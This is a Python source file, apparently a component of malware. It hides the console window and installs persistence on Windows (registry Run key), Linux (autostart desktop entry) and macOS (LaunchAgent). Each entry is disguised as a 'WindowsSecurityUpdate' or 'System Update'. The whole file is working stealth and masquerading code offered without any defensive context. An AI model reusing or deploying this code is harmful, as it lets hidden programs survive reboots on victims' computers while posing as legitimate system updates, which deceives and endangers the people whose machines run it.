import sys
import os
import logging

def hide_console():
    if sys.platform == 'win32':
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    # No console hiding needed on Linux/macOS

def add_to_startup():
    if sys.platform == 'win32':
        try:
            import winreg
            reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, os.path.realpath(sys.argv[0]))
        except Exception as e:
            logging.error(f"Failed to add to startup: {e}")

    elif sys.platform.startswith('linux'):
        autostart_dir = os.path.expanduser('~/.config/autostart')
        os.makedirs(autostart_dir, exist_ok=True)
        desktop_entry = f"""[Desktop Entry]
Type=Application
Exec=python3 {os.path.abspath(sys.argv[0])}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name=System Update
Comment=Auto-start System Update
"""
        with open(os.path.join(autostart_dir, "system_update.desktop"), "w") as f:
            f.write(desktop_entry)

    elif sys.platform == 'darwin':
        # macOS LaunchAgent
        launch_agents_dir = os.path.expanduser('~/Library/LaunchAgents')
        os.makedirs(launch_agents_dir, exist_ok=True)
        plist_name = "com.system.update.plist"
        plist_path = os.path.join(launch_agents_dir, plist_name)
        python_exec = sys.executable  # Path to the current Python interpreter
        script_path = os.path.abspath(sys.argv[0])
        plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>{python_exec}</string>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <false/>
    <key>StandardOutPath</key>
    <string>/tmp/system_update.log</string>
    <key>StandardErrorPath</key>
    <string>/tmp/system_update.err</string>
</dict>
</plist>
"""
        try:
            with open(plist_path, "w") as f:
                f.write(plist_content)
            os.system(f"launchctl load {plist_path}")
            logging.info(f"Added LaunchAgent for startup: {plist_path}")
        except Exception as e:
            logging.error(f"Failed to add LaunchAgent for startup: {e}")
